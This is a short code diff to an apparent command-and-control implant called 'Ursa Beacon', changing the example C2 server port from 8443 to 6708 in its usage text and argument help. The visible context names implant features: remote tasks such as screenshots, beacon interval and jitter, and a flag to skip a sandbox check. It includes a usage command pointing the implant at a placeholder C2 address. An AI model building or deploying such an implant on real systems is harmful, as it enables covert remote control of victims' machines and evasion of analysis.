@@ -22,7 +22,7 @@ Task Types:
     screenshot  — Take a screenshot (if supported)
 
 Usage:
-    python3 beacon.py --server http://C2_IP:8443 [--interval 5] [--jitter 0.1]
+    python3 beacon.py --server http://C2_IP:6708 [--interval 5] [--jitter 0.1]
 """
 
 import sys
@@ -739,7 +739,7 @@ class UrsaBeacon:
 
 def main():
     parser = argparse.ArgumentParser(description="Ursa Beacon Implant")
-    parser.add_argument("--server", required=True, help="C2 server URL (e.g., http://10.0.0.1:8443)")
+    parser.add_argument("--server", required=True, help="C2 server URL (e.g., http://10.0.0.1:6708)")
     parser.add_argument("--interval", type=int, default=5, help="Beacon interval in seconds")
     parser.add_argument("--jitter", type=float, default=0.3, help="Jitter factor 0.0-1.0 (default 0.3 = ±30%%)")
     parser.add_argument("--no-sandbox-check", action="store_true",
